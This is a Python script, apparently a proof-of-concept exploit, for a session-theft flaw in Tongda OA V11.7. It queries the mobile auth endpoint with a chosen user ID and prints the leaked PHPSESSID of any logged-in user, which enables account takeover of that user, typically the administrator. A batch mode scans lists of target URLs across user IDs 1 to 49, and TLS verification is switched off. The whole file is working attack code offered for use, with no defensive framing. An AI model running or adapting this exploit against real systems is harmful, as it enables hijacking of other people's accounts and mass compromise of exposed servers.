import requests
import argparse
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'}

def title():
	print('通达OA V11.7 获取在线用户Session')


def scan(target_url, uid):
	# /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
	vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=" + str(uid) + "&P_VER=0"
	while True:
		r = requests.get(url=vuln_url, headers=headers, verify=False, timeout = 5)
		try:
			if r.status_code == 200 and r.text == '':
				PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(r.headers))
				print('uid={0} 在线中，SESSION值为 {1}'.format(uid, PHPSESSION[0]))
				break
			else:
				print('uid={0} 暂时不在线，持续获取 session 中'.format(uid))
		except Exception as e:
			print('URL 访问异常 {0}'.format(target_url))
			break

def fast_scan(url_path):
	print(url_path)
	for uid in range(1, 50):
		target_url_path = url_path + "/mobile/auth_mobi.php?isAvatar=1&uid=" + str(uid) + "&P_VER=0"
		try:
			r = requests.get(url=target_url_path, headers=headers, verify=False, timeout = 5)
			if r.status_code == 200 :
				if r.text == '':
					PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(r.headers))
					print('[+] URL = {0}，uid={1} ，SESSION值为 {2}'.format(url_path, uid, PHPSESSION[0]))
				else:
					print('[-] URL: {0} 未登录'.format(target_url_path))
		except Exception as e:
			print('[-] URL: {0} 异常'.format(target_url_path))

def format_url(url):
	try:
		if url[:4] != "http":
			url = "http://" + url
			url = url.strip()
		return url
	except Exception as e:
		print('URL 错误 {0}'.format(url))

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--id', type=int, help=' 指定 UID', default=1)
	parser.add_argument('-u', '--url', type=str, help=' 目标　URL ')
	parser.add_argument('-f', '--file', type=str, help=' 批量文件路径 ')
	args = parser.parse_args()

	uid = args.id
	url = args.url
	url_file = args.file

	if  not url is None :
		target_url = format_url(url)
		scan(target_url, uid)
	elif url_file != '':
		for url_link in open(url_file, 'r', encoding='utf-8'):
			if url_link.strip() != '':
				url_path = format_url(url_link.strip())
				fast_scan(url_path)
	else:
		sys.exit(0)

if __name__ == '__main__':
	main()